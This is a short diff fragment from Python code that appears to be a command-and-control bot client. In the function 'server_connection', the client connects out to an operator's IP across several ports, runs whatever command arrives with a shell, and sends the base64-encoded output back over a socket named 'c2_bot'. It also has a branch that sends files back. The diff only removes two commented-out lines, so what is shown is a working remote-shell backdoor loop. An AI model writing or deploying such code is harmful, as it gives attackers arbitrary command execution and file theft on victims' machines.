@@ -72,10 +72,8 @@ def server_connection(ip, ports):
                     send_file(c2_bot, file_name)
                 else:
                     result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-                    # result = proc.stdout.read() + proc.stderr.read()
                     return_code = result.returncode
                     c2_bot.sendall(base64_encode(result.stdout))
-                    # c2_bot.sendall(b'')
             break
         except:
             print(f"Connection failed on port {port}")
